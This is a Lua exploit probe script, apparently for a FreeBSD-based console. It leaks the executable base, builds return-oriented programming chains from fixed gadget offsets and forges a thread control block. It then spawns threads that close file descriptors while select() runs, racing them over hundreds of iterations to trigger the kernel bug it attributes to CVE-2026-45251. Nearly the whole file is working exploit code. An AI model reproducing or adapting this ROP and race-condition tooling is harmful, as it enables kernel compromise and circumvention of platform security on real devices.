-- CRASH_CLASS: MODERATE
-- PROBE 502a: select()+close() heavy race — wider window variant
--
-- CVE-2026-45251 also names select(2).  This probe uses select(93) instead
-- of poll, and runs 200 iterations per fd type to widen the race window.
-- Additionally it tries to overlap TWO child threads closing the same fd
-- (double-close race while parent is in select).

print("=== PROBE 502a: select()+close() heavy race ===")
print("")

------------------------------------------------------------------ helpers
local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_wq(addr, val)
    local ok = pcall(function() memory.write_qword(addr, val) end)
    return ok
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function fmt_hex(val)
    local h, l = get_hi_lo(val)
    if h == 0 then return string.format("0x%X", l) end
    return string.format("0x%X%08X", h, l)
end

------------------------------------------------------------------ eboot base + fn_addr
local info = memory.alloc(0x200)
safe_wd(info, 0x160)
local sc593 = make_syscall(593)
pcall(function() sc593(uint64(0), info) end)
local eb_lo = safe_rd(info + 0x108)
local eb_hi = safe_rd(info + 0x10C)
if not eb_lo or not eb_hi then print("FATAL: eboot base"); return end
local eboot = uint64(string.format("0x%X%08X", eb_hi, eb_lo))
print("eboot: " .. fmt_hex(eboot))

local pipe_str = tostring(syscall.pipe)
local fn_str = pipe_str:match("fcall_stub%.fn_addr: (0x[0-9a-fA-F]+)")
if not fn_str then print("FATAL: fn_addr"); return end
local fn_addr = uint64(fn_str)
print("fn_addr: " .. fn_str)

------------------------------------------------------------------ gadgets
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local pop_rsi_ret = eboot + uint64(0xD77D)

------------------------------------------------------------------ fake TCB (shared)
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFF8, 8 do safe_wq(fake_tcb + i, fake_tcb) end
local tcb_ptr_buf = memory.alloc(8)
safe_wq(tcb_ptr_buf, fake_tcb)

------------------------------------------------------------------ syscalls
local sc455 = make_syscall(455)
local sc93  = make_syscall(93)   -- select
local sc135 = make_syscall(135)  -- socketpair
local sc97  = make_syscall(97)   -- socket
local sc362 = make_syscall(362)  -- kqueue
local sc6   = make_syscall(6)    -- close
local sc20  = make_syscall(20)   -- getpid
local sc624 = make_syscall(624)  -- VM ops

local STACK_SIZE = 0x200000
local pid = to_num(sc20())
print("pid: " .. pid)

------------------------------------------------------------------ spawn child that does: sysarch + close(fd) + thr_exit
local function spawn_closer(target_fd)
    local sc477 = make_syscall(477)
    local child_stack = sc477(uint64(0), uint64(STACK_SIZE), uint64(0x3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local cs_h, cs_l = get_hi_lo(child_stack)
    if cs_h == 0 and cs_l == 0 then return nil, nil end

    -- compute RSP
    local top = child_stack + uint64(STACK_SIZE)
    local top_lo = to_num(top)
    local rsp = top - uint64(top_lo % 16) - uint64(8)

    local off = 0
    local function wq(val) safe_wq(rsp + off, val); off = off + 8 end

    -- sysarch(SET_FSBASE=129, tcb_ptr_buf)
    wq(tcb_ptr_buf)         -- pop rsi
    wq(pop_rax_ret)
    wq(uint64(165))         -- SYS_sysarch
    wq(fn_addr)
    -- close(fd)
    wq(pop_rdi_ret)
    wq(uint64(target_fd))
    wq(pop_rax_ret)
    wq(uint64(6))           -- SYS_close
    wq(fn_addr)
    -- thr_exit(0)
    wq(pop_rdi_ret)
    wq(uint64(0))
    wq(pop_rax_ret)
    wq(uint64(431))
    wq(fn_addr)

    local param = memory.alloc(0x40)
    for j = 0, 0x38, 4 do safe_wd(param + j, 0) end
    safe_wq(param + 0x00, pop_rsi_ret)
    safe_wq(param + 0x08, uint64(129))
    safe_wq(param + 0x10, child_stack)
    safe_wq(param + 0x18, uint64(STACK_SIZE))

    pcall(function() sc455(uint64(to_num(param)), uint64(0x38)) end)

    return child_stack, param
end

------------------------------------------------------------------ select helper
-- select(nfds, readfds, writefds, exceptfds, timeout)
-- fd_set: 128 bytes (FD_SETSIZE=1024, 1024/8=128)
-- FD_SET(fd, set): set byte (fd/8), bit (fd%8)

local function run_select_close_race(fd_name, create_fd_fn, iterations)
    print("")
    print("--- " .. fd_name .. " (" .. iterations .. " iter) ---")
    local survived = 0
    local results = {}

    for i = 1, iterations do
        local target_fd = create_fd_fn()
        if not target_fd or target_fd < 0 then
            print("  [" .. i .. "] fd creation failed")
            break
        end

        -- build fd_set for select: set the target_fd bit
        local readfds = memory.alloc(128)
        for j = 0, 124, 4 do safe_wd(readfds + j, 0) end
        local byte_idx = math.floor(target_fd / 8)
        local bit_idx  = target_fd % 8
        if byte_idx < 128 then
            safe_wd(readfds + byte_idx, math.pow(2, bit_idx))
        end

        -- timeout: 0 seconds, 100000 microseconds (100ms)
        local tv = memory.alloc(16)
        safe_wq(tv + 0, uint64(0))         -- tv_sec
        safe_wq(tv + 8, uint64(100000))    -- tv_usec

        -- spawn closer child
        local cs, _ = spawn_closer(target_fd)

        -- immediately select()
        local sel_ok, sel_ret = pcall(function()
            return sc93(uint64(target_fd + 1), uint64(to_num(readfds)),
                        uint64(0), uint64(0), uint64(to_num(tv)))
        end)

        local rv = "?"
        if sel_ok then rv = tostring(to_num(sel_ret)) else rv = "CRASH" end
        results[rv] = (results[rv] or 0) + 1
        survived = survived + 1

        -- cleanup stack
        if cs then
            local sc73 = make_syscall(73)
            pcall(function() sc73(cs, uint64(STACK_SIZE)) end)
        end

        if i % 50 == 0 then print("  progress: " .. i .. "/" .. iterations) end
    end

    print("  survived: " .. survived .. "/" .. iterations)
    for k, v in pairs(results) do
        print("    ret=" .. k .. " : " .. v .. "x")
    end
end

------------------------------------------------------------------ fd creators
local function create_unix_dgram()
    local sv = memory.alloc(8)
    safe_wd(sv, 0xFFFFFFFF); safe_wd(sv + 4, 0xFFFFFFFF)
    pcall(function() sc135(uint64(1), uint64(2), uint64(0), uint64(to_num(sv))) end)
    local fd0 = safe_rd(sv)
    local fd1 = safe_rd(sv + 4)
    if fd0 and fd0 ~= 0xFFFFFFFF and fd1 and fd1 ~= 0xFFFFFFFF then
        pcall(function() sc6(uint64(fd1)) end)
        return fd0
    end
    return nil
end

local function create_tcp()
    local ok, fd = pcall(function() return sc97(uint64(2), uint64(1), uint64(0)) end)
    if ok then local v = to_num(fd); if v > 0 and v < 0xFFFF then return v end end
    return nil
end

local function create_kqueue()
    local ok, fd = pcall(function() return sc362() end)
    if ok then local v = to_num(fd); if v > 0 and v < 0xFFFF then return v end end
    return nil
end

local function create_udp6()
    -- AF_INET6=28, SOCK_DGRAM=2
    local ok, fd = pcall(function() return sc97(uint64(28), uint64(2), uint64(0)) end)
    if ok then local v = to_num(fd); if v > 0 and v < 0xFFFF then return v end end
    return nil
end

local function create_raw4()
    -- AF_INET=2, SOCK_RAW=3, IPPROTO_RAW=255
    local ok, fd = pcall(function() return sc97(uint64(2), uint64(3), uint64(255)) end)
    if ok then local v = to_num(fd); if v > 0 and v < 0xFFFF then return v end end
    return nil
end

------------------------------------------------------------------ baseline
local vm0 = to_num(sc624())
print("VM ops: " .. vm0)
print("")

local ITERS = 200

print("=== PHASE 1: Standard socket types ===")
run_select_close_race("AF_UNIX SOCK_DGRAM", create_unix_dgram, ITERS)
run_select_close_race("AF_INET SOCK_STREAM (TCP)", create_tcp, ITERS)
run_select_close_race("AF_INET6 SOCK_DGRAM (UDPv6)", create_udp6, ITERS)
run_select_close_race("AF_INET SOCK_RAW", create_raw4, ITERS)

print("")
print("=== PHASE 2: Kernel objects ===")
run_select_close_race("kqueue", create_kqueue, ITERS)

------------------------------------------------------------------ post-check
print("")
print("=== VERIFICATION ===")
local pid2 = to_num(sc20())
print("pid: " .. pid2 .. (pid2 == pid and " [OK]" or " [CHANGED!]"))
local vm1 = to_num(sc624())
print("VM ops: " .. vm1 .. " (delta=" .. (vm1 - vm0) .. ")")

print("")
print("=== PROBE 502a COMPLETE ===")
